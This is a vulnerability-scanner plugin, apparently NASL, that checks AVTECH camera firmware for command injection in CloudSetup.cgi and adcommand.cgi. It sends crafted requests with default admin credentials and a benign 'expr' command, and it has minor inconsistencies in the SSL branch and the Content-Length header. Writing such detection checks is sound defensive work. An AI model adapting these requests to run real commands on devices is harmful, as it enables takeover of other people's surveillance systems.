############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799022);
 name = "AVTECH monitoring product-CloudSetup.cgi - background remote command execution";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"Avtech video monitoring cloudsetup.cgi file background remote command execution vulnerability, hackers can execute arbitrary commands on the server, write to the back door, so as to invade the server, access to the administrator rights of the server, great harm.");
 script_set_attribute(attribute:"solution", value:"Strictly filter the data entered by the user and prohibit the execution of system commands.");
 script_end_attributes();
 exit(0);
}


#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==80 ) host=host1;
    else host = string(host1,":",port);
	req1 = 'POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Accept-Language: en-US,en;q=0.5\r\n' +
      'Authorization: Basic YWRtaW46YWRtaW4=\r\n' +
      'Connection: close\r\n' +
	  'Upgrade-Insecure-Requests: 1\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: 23\r\n\r\n' +
	  'DoShellCmd "strCmd=expr 623595574529 + 15349457644&"';
	req2 = 'GET /cgi-bin/supervisor/CloudSetup.cgi?exefile=expr%20623595574529%20+%2015349457644 HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Accept-Language: en-US,en;q=0.5\r\n' +
      'Authorization: Basic YWRtaW46YWRtaW4=\r\n' +
      'Connection: close\r\n' +
	  'Upgrade-Insecure-Requests: 1\r\n\r\n';
     
	buf1 = http_keepalive_send_recv(port:port,data:req1,bodyonly:FALSE);
	buf2 = http_keepalive_send_recv(port:port,data:req2,bodyonly:FALSE);
	if( buf1 == NULL && buf2 == NULL ) exit(0);
	con = req1 + buf1 + req2 + buf2;
	if( ("200 O"><buf1 && "638945032173"><buf1) || ("200 O"><buf2 && "638945032173"><buf2) ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==443 ) host=host1;
    else host = string(host1,":",port);

	req1 = 'POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Accept-Language: en-US,en;q=0.5\r\n' +
      'Authorization: Basic YWRtaW46YWRtaW4=\r\n' +
      'Connection: close\r\n' +
	  'Upgrade-Insecure-Requests: 1\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: 23\r\n\r\n' +
	  'DoShellCmd "strCmd=expr 623595574529 + 15349457644&"';
	req2 = 'GET /cgi-bin/supervisor/CloudSetup.cgi?exefile=echo%20623595574529%20+%2015349457644 HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Accept-Language: en-US,en;q=0.5\r\n' +
      'Authorization: Basic YWRtaW46YWRtaW4=\r\n' +
      'Connection: close\r\n' +
	  'Upgrade-Insecure-Requests: 1\r\n\r\n';
    
	ssl_req1 = https_req_get(port:port,request:req1);
	ssl_req2 = https_req_get(port:port,request:req2);
	if( ssl_req1 == NULL && ssl_req2 == NULL) exit(0);
	con = req1 + ssl_req1 + req2 + ssl_req2;
	if( ("200 O"><ssl_req1 && "638945032173"><ssl_req1) || ("200 O"><ssl_req2 && "638945032173"><ssl_req2) ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
